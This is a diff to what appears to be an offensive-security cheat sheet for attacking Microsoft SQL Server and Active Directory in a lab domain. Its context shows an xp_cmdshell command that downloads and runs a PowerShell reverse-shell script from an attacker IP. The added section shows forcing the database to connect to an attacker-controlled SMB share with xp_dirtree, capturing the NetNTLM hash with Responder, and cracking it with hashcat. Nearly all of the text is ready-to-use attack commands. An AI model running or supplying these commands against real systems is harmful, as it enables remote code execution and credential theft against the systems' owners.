@@ -1407,6 +1407,18 @@ send back a shell:
 Get-SQLServerLinkCrawl -Instance db01-mssql.ecorp.bcorp.lab -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1'')"'
 ```
 
+#### PrivEsc 
+
+use ```xp_dirtree``` to force the sqldb to connect to an smb share we control snd steal the hash with responder:
+
+```EXEC master..xp_dirtree \"\\\\192.168.3.25\\\\test\```
+
+```sudo responder -I eth0```
+
+crack with hashcat:
+
+```hashcat -m 5600 hash.txt dict.txt```
+
 # Forest Persistence - DCShadow
 ```Set-DCShadowPermissions```
 
